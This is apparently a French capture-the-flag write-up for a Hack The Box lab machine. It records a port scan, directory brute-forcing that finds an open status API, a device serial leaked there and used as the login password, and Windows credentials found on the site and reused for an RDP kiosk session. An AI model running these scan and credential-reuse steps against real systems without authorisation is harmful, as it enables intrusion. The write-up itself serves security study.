# Rapport CTF — Nexion DeviceHub / HTB Airways Kiosk

**Cible :** 10.129.6.187

---

## 1. Scan de ports

```bash
nmap -Pn -sC -sV -p- -oN nmap_full.txt 10.129.6.187
```

| Port | Service | Détail |
|------|---------|--------|
| 135/tcp | msrpc | Microsoft Windows RPC |
| 3389/tcp | ms-wbt-server | RDP |
| 5985/tcp | http | WinRM (HTTPAPI) |
| 8443/tcp | http | Nexion DeviceHub - Login (HTTP brut malgré le port) |

⚠️ Le port 8443 sert du HTTP en clair, pas du HTTPS. Utiliser `http://` et non `https://`.

---

## 2. Accès à l'application web (port 8443)

Page de login : `http://10.129.6.187:8443/login` — un seul champ **mot de passe**.

Indice trouvé dans le code source HTML (attribut `title` du lien "Forgot your password?") :
> *"The default password is the device serial number included in your DeviceHub packaging."*

### Énumération des routes

```bash
gobuster dir -u http://10.129.6.187:8443 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x json -b 302
```
→ révèle `/api` (403, accessible directement sans redirection vers `/login`)

```bash
gobuster dir -u http://10.129.6.187:8443/api -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x json -b 302
```
→ révèle `/api/status` (200)

### Récupération du mot de passe

```bash
curl -s http://10.129.6.187:8443/api/status
```
```json
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":56813}
```

✅ **Mot de passe : `NX-DH-2024-B7042`** → connexion réussie sur `/login`.

---

## 3. Identifiants Windows trouvés sur le site

En navigant sur l'interface web après authentification :
```
Utilisateur : KioskUser
Mot de passe : K!0sk2026#
```

### Connexion RDP

```bash
xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.6.187 /cert:ignore +clipboard
```

✅ Connexion réussie → session en mode kiosque plein écran, application "HTB Airways" (réservation de billets).

---

## Résumé des identifiants validés

| Élément | Valeur |
|---|---|
| Mot de passe login web (8443) | `NX-DH-2024-B7042` |
| Identifiants RDP | `KioskUser` / `K!0sk2026#` |